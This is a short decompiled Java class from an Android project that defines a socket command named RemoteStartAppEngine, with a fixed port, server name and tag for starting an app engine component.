package com.vvt.polymorphic.command;

import com.fx.socket.TcpSocketCmd;

public class RemoteStartAppEngine
  extends TcpSocketCmd
{
  private static final long serialVersionUID = -3146489481854140240L;
  
  public RemoteStartAppEngine()
  {
    super(null, Boolean.class);
  }
  
  protected int getPort()
  {
    return 12514;
  }
  
  protected String getServerName()
  {
    return "vvt.polymorphic.server";
  }
  
  protected String getTag()
  {
    return "RemoteStartAppEngine";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/polymorphic/command/RemoteStartAppEngine.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */